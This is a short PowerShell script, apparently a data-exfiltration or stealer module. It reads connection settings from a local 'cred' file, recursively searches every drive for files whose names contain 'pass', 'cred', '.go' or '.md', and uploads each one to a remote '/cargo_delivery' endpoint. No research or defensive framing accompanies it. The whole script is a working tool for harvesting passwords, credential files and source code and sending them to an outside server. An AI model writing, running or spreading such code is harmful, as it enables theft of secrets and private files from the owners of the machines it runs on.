# Path to the credentials JSON file
$credFilePath = "cred"

# Function to read and parse JSON credentials
function Get-Credentials {
    param (
        [string]$filePath
    )

    $jsonContent = Get-Content -Path $filePath -Raw | ConvertFrom-Json
    return $jsonContent
}

# Read credentials from JSON file
$creds = Get-Credentials -filePath $credFilePath

# Extract credentials
$espID = $creds.esp_id
$deliveryKey = $creds.delivery_key
$encryptionPassword = $creds.encryption_password
$url = "http://$($creds.URL):$($creds.Port)/cargo_delivery"

# Function to search for files
function Search-Files {
    param (
        [string]$rootDir,
        [string[]]$patterns
    )

    $files = @()
    foreach ($pattern in $patterns) {
        $files += Get-ChildItem -Path $rootDir -Recurse -Include *$pattern* -ErrorAction SilentlyContinue
    }

    return $files
}

# Function to upload a file
function Upload-File {
    param (
        [string]$filePath
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)

    $form = @{
        "esp_id" = $espID
        "delivery_key" = $deliveryKey
        "encryption_password" = $encryptionPassword
        "file" = Get-Item -Path $filePath
    }

    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -Form $form
        Write-Output "File uploaded successfully: $filePath"
    } catch {
        Write-Output "Error uploading file: $filePath"
        Write-Output $_.Exception.Message
    }
}

# Get all drives
$drives = Get-PSDrive -PSProvider FileSystem

# Search for files and upload them
foreach ($drive in $drives) {
    $driveRoot = $drive.Root
    Write-Output "Searching in drive: $driveRoot"

    $files = Search-Files -rootDir $driveRoot -patterns @(".go", ".md", "pass", "cred")

    foreach ($file in $files) {
        Upload-File -filePath $file.FullName
    }
}